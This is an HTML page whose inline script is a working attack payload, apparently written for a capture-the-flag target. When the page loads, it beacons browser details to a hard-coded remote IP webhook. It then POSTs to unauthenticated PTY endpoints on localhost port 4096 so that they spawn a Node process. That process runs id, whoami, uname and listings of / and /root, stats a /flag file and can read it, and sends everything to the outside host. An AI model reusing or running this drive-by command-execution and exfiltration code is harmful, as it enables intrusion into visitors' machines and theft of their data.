  <!doctype html>
  <meta charset="utf-8">
  <script>
  (() => {
  const WEBHOOK = "https://47.118.30.30:9999";
  const READ_FLAG = false;
  const TARGETS = [
    "http://127.0.0.1:4096/pty",
    "http://localhost:4096/pty",
  ];
  const PROBE_ID = `openshell-${Date.now()}-${Math.random().toString(16).slice(2)}`;

  async function fireAndForget(url, body) {
    try {
      await fetch(url, {
        method: "POST",
        mode: "no-cors",
        headers: {
          "Content-Type": "text/plain",
        },
        body: typeof body === "string" ? body : JSON.stringify(body),
        keepalive: true,
      });
    } catch {}
  }

  async function browserBeacon(stage, extra) {
    const lines = [
      `stage=${stage}`,
      `probe_id=${PROBE_ID}`,
      `href=${location.href}`,
      `origin=${location.origin}`,
      `ua=${navigator.userAgent}`,
    ];

    if (extra) {
      lines.push(`extra=${JSON.stringify(extra)}`);
    }

    await fireAndForget(WEBHOOK, lines.join("\n"));
  }

  function buildNodeProbe() {
    return String.raw`
const { execSync } = require("child_process");
const http = require("http");
const https = require("https");
const { URL } = require("url");

const webhook = new URL(${JSON.stringify(WEBHOOK)});
const probeId = ${JSON.stringify(PROBE_ID)};
const readFlag = ${READ_FLAG ? "true" : "false"};

function sh(cmd) {
  try {
    return execSync(cmd, {
      encoding: "utf8",
      stdio: ["ignore", "pipe", "pipe"],
    });
  } catch (error) {
    const stdout = error && error.stdout ? error.stdout.toString() : "";
    const stderr = error && error.stderr ? error.stderr.toString() : "";
    const message = error && error.message ? error.message : String(error);
    return "[error] " + cmd + "\n" + stdout + stderr + message + "\n";
  }
}

const out = [];
out.push("stage=server-side-pty");
out.push("probe_id=" + probeId);
out.push("time=" + new Date().toISOString());
out.push("cwd=" + process.cwd());
out.push("node=" + process.version);
out.push("$ id");
out.push(sh("id"));
out.push("$ whoami");
out.push(sh("whoami"));
out.push("$ uname -a");
out.push(sh("uname -a"));
out.push("$ pwd");
out.push(sh("pwd"));
out.push("$ ls -la /");
out.push(sh("ls -la /"));
out.push("$ ls -la /root");
out.push(sh("ls -la /root"));
out.push("$ ls -la /home");
out.push(sh("ls -la /home"));
out.push("$ stat /flag");
out.push(sh("stat /flag"));

if (readFlag) {
  out.push("$ chmod 644 /flag && cat /flag");
  out.push(sh("chmod 644 /flag 2>/dev/null; cat /flag 2>/dev/null"));
}

const body = Buffer.from(out.join("\n\n"));
const client = webhook.protocol === "https:" ? https : http;
const req = client.request(
  webhook,
  {
    method: "POST",
    headers: {
      "Content-Type": "text/plain",
      "Content-Length": String(body.length),
    },
  },
  (res) => {
    res.resume();
    res.on("end", () => process.exit(0));
  },
);

req.on("error", () => process.exit(1));
req.end(body);
`;
  }

  async function launch(target) {
    const payload = {
      command: "node",
      args: ["-e", buildNodeProbe()],
      title: `probe-${PROBE_ID}`,
    };

    await fireAndForget(target, payload);
    await browserBeacon("browser-post-sent", { target });
  }

  (async () => {
    await browserBeacon("browser-start");

    for (const target of TARGETS) {
      await launch(target);
    }

    await browserBeacon("browser-finished");
  })();
})();

  </script>
